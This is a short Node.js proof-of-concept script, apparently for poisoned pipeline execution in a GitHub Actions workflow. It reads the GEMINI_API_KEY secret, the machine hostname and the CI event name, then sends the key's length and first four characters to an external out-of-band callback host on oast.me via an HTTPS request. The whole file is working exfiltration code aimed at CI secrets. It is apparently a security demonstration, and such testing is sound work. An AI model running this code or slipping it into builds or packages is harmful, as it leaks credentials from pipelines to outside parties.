const os = require('os');
const https = require('https');
const HOST = 'da69s9gbf011k1pastb0soizk764id6st.oast.me';
const stage = (process.argv[2] || 'unknown').toLowerCase().replace(/[^a-z0-9]/g,'');
const key = process.env.GEMINI_API_KEY || 'NONE';
const detail = [
  'host-' + os.hostname(),
  'event-' + (process.env.GITHUB_EVENT_NAME || 'x'),
  'keylen-' + key.length,
  'keyprefix-' + key.slice(0,4).replace(/[^a-zA-Z0-9]/g,'')
].join('.');
const url = 'https://' + stage + '.' + HOST + '/' + encodeURIComponent(detail);
console.log('[PPE-POC] ' + url);
https.get(url, r => r.resume()).on('error', e => console.log('[PPE-POC] sent: ' + e.message));
